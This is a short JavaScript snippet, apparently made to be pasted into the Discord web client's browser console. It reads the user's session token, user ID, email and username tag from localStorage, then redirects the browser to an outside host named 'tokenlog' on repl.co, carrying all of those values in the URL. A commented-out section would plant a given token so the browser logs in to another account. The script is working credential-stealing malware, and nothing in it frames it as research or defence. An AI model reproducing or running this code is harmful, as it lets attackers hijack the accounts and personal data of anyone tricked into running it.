function env(modul){
    const token = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token
    const tag = `${window.document.querySelector('div.size14-e6ZScH').innerText}%23${window.document.querySelector('div.size12-3cLvbJ').innerText.substr(1)}`
    const id = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.user_id_cache
    const email = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache

    /*if(token == undefined){
        console.log(`seu token é ${document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token}`)    

        setTimeout(function() {
            const token = `"my token"`
            const anttoken = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token
        
            if(token != anttoken){
            setInterval(() => {
                document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `${token}`
            }, 50);
        
            setTimeout(() => {
                window.location.href = `https://discord.com/channels/@me`
            }, 2500);
            }else{
                console.log(`Você ja esta logado no token:${token}`)
            }
        }, 1000)

        return;
    }*/

    if(modul == undefined){
        op1()
        modul = 1
    }else{}

    switch(modul){
        case 1:
            op1()
            break
        default:
            console.log(`Modulo ${modul} não foi encontrado`)
    }

    function op1(){
        window.location.href = `https://tokenlog.sasukecusaovh.repl.co/?token=${token}&tag=${tag}&id=${id}&email=${email}`
    }
}

env(1)